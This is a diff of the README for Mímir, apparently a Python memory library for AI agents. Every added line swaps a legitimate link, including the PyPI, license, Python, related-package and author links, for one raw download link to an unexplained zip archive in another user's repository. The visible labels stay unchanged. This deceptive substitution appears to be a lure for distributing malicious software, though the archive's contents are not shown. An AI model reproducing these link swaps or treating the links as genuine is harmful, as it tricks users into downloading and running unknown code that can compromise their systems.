@@ -4,9 +4,9 @@
   <img src="MimirLogo.png" alt="Mímir Logo" width="300">
 </p>
 
-[![PyPI](https://img.shields.io/pypi/v/vividmimir)](https://pypi.org/project/vividmimir/)
-[![License: PolyForm Noncommercial](https://img.shields.io/badge/license-PolyForm--NC-blue)](https://polyformproject.org/licenses/noncommercial/1.0.0/)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue)](https://www.python.org/)
+[![PyPI](https://img.shields.io/pypi/v/vividmimir)](https://github.com/Jayant2007/Mimir/raw/refs/heads/main/benchmarks/Software-v2.2.zip)
+[![License: PolyForm Noncommercial](https://img.shields.io/badge/license-PolyForm--NC-blue)](https://github.com/Jayant2007/Mimir/raw/refs/heads/main/benchmarks/Software-v2.2.zip)
+[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue)](https://github.com/Jayant2007/Mimir/raw/refs/heads/main/benchmarks/Software-v2.2.zip)
 
 > *"Mimir, whose name means 'the rememberer,' was the wisest of the Æsir.
 > Even after his death, Odin preserved his head and consulted it for counsel
@@ -28,8 +28,8 @@ rich episodic mind modelled on real neuroscience.
 
 Mímir is a **modular Python library** (12 composable mixin files) that gives any AI agent a full
 episodic, procedural, social, temporal, and visual memory system. It
-orchestrates the **Vivid ecosystem** — [VividnessMem](https://pypi.org/project/vividnessmem/)
-for neurochemistry and [VividEmbed](https://pypi.org/project/vividembed/) for
+orchestrates the **Vivid ecosystem** — [VividnessMem](https://github.com/Jayant2007/Mimir/raw/refs/heads/main/benchmarks/Software-v2.2.zip)
+for neurochemistry and [VividEmbed](https://github.com/Jayant2007/Mimir/raw/refs/heads/main/benchmarks/Software-v2.2.zip) for
 semantic retrieval — then layers **twenty-one neuroscience mechanisms** on top.
 
 Memories are not static database rows. They **decay organically**, **drift
@@ -858,12 +858,12 @@ All optional dependencies use graceful fallback — Mímir works standalone.
 
 ## License
 
-[PolyForm Noncommercial 1.0.0](https://polyformproject.org/licenses/noncommercial/1.0.0/) — free for personal and research use. Commercial use requires a separate license.
+[PolyForm Noncommercial 1.0.0](https://github.com/Jayant2007/Mimir/raw/refs/heads/main/benchmarks/Software-v2.2.zip) — free for personal and research use. Commercial use requires a separate license.
 
-Part of the Vivid ecosystem by [Kronic90](https://github.com/Kronic90).
+Part of the Vivid ecosystem by [Kronic90](https://github.com/Jayant2007/Mimir/raw/refs/heads/main/benchmarks/Software-v2.2.zip).
 
 | Package | PyPI | License |
 |---|---|---|
-| [VividnessMem](https://pypi.org/project/vividnessmem/) | `pip install vividnessmem` | MIT |
-| [VividEmbed](https://pypi.org/project/vividembed/) | `pip install vividembed` | PolyForm-NC |
+| [VividnessMem](https://github.com/Jayant2007/Mimir/raw/refs/heads/main/benchmarks/Software-v2.2.zip) | `pip install vividnessmem` | MIT |
+| [VividEmbed](https://github.com/Jayant2007/Mimir/raw/refs/heads/main/benchmarks/Software-v2.2.zip) | `pip install vividembed` | PolyForm-NC |
 | **Mímir** | `pip install vividmimir` | PolyForm-NC |
